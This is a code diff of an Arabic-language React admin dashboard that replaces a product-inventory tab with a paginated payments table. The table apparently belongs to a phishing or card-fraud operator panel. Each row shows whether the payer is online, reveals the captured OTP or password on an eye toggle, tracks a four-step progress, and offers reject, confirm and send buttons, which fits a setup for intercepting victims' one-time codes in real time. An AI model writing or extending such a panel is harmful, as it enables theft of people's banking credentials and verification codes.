+                          <Badge className="bg-green-100 text-green-800">
+                            متصل
+                          </Badge>
+                        ) : (
+                          <Badge className="bg-red-100 text-red-800">
+                            غير متصل
+                          </Badge>
+                        )}
+                      </td>
+                      <td className="p-3 text-muted-foreground">
+                        {getTimeAgo(payment.createdDate)}
+                      </td>
+                      <td className="p-3">
+                        <Badge variant="outline" className="text-muted-foreground">
+                          {payment.online ? "متصل" : "غير متصل"}
+                        </Badge>
+                      </td>
+                      <td className="p-3">
+                        <div className="flex items-center gap-1">
+                          <Badge variant="secondary" className="font-mono bg-amber-100 text-amber-800">
+                            {isSensitiveVisible(payment.id, 'code') 
+                              ? (payment.otp || payment.pass || "---")
+                              : "****"
+                            }
+                          </Badge>
+                          <Button
+                            variant="ghost"
+                            size="icon"
+                            className="h-6 w-6"
+                            onClick={() => toggleSensitive(payment.id, 'code')}
+                            data-testid={`toggle-code-${payment.id}`}
+                          >
+                            {isSensitiveVisible(payment.id, 'code') 
+                              ? <EyeOff className="h-3 w-3" />
+                              : <Eye className="h-3 w-3" />
+                            }
+                          </Button>
+                        </div>
+                      </td>
+                      <td className="p-3">
+                        <div className="flex items-center gap-1">
+                          <div className="flex gap-0.5">
+                            {[1, 2, 3, 4].map((step) => (
+                              <div
+                                key={step}
+                                className={`h-2 w-2 rounded-full ${
+                                  step <= (payment.step || 1) 
+                                    ? 'bg-green-500' 
+                                    : 'bg-gray-300'
+                                }`}
+                              />
+                            ))}
+                          </div>
+                        </div>
+                      </td>
+                      <td className="p-3">
+                        <div className="flex items-center gap-1">
+                          <Badge className="cursor-pointer hover:opacity-80">
+                            P
+                          </Badge>
+                          <Button
+                            size="sm"
+                            variant="destructive"
+                            className="h-7 px-2 text-xs rounded-full"
+                            data-testid={`button-reject-${payment.id}`}
+                          >
+                            رفض
+                          </Button>
+                          <Button
+                            size="sm"
+                            className="h-7 px-2 text-xs rounded-full bg-orange-500 hover:bg-orange-600"
+                            data-testid={`button-confirm-${payment.id}`}
+                          >
+                            تأكيد
+                          </Button>
+                          <Button
+                            size="sm"
+                            className="h-7 px-2 text-xs rounded-full bg-green-500 hover:bg-green-600"
+                            data-testid={`button-send-${payment.id}`}
+                          >
+                            إرسال
+                          </Button>
+                        </div>
+                      </td>
+                    </tr>
                   ))}
-                </div>
-              </div>
-            )}
-          </TabsContent>
+                </tbody>
+              </table>
+            </div>
+          )}
 
-          <TabsContent value="products">
-            <Card>
-              <CardHeader className="flex flex-row items-center justify-between gap-4 flex-wrap">
-                <CardTitle>Product Inventory</CardTitle>
-              </CardHeader>
-              <CardContent className="p-0">
-                {productsLoading ? (
-                  <div className="flex justify-center py-12">
-                    <Loader2 className="h-8 w-8 animate-spin text-primary" />
-                  </div>
-                ) : (
-                  <div className="divide-y">
-                    {products?.map((product) => (
-                      <ProductRow 
-                        key={product.id} 
-                        product={product} 
-                        onUpdate={() => refetchProducts()}
-                      />
-                    ))}
-                  </div>
-                )}
-              </CardContent>
-            </Card>
-          </TabsContent>
-        </Tabs>
+          {totalPages > 1 && (
+            <div className="p-4 border-t flex items-center justify-between gap-4">
+              <div className="text-sm text-muted-foreground">
+                عرض {(currentPage - 1) * itemsPerPage + 1} - {Math.min(currentPage * itemsPerPage, filteredPayments.length)} من {filteredPayments.length}
+              </div>
+              <div className="flex items-center gap-2">
+                <Button
+                  variant="outline"
+                  size="icon"
+                  onClick={() => setCurrentPage(p => Math.max(1, p - 1))}
+                  disabled={currentPage === 1}
+                  data-testid="button-prev-page"
+                >
+                  <ChevronRight className="h-4 w-4" />
+                </Button>
+                <span className="text-sm px-2">
+                  {currentPage} / {totalPages}
+                </span>
+                <Button
+                  variant="outline"
+                  size="icon"
+                  onClick={() => setCurrentPage(p => Math.min(totalPages, p + 1))}
+                  disabled={currentPage === totalPages}
+                  data-testid="button-next-page"
+                >
+                  <ChevronLeft className="h-4 w-4" />
+                </Button>
+              </div>
+            </div>
+          )}
+        </div>
       </main>
     </div>
   );
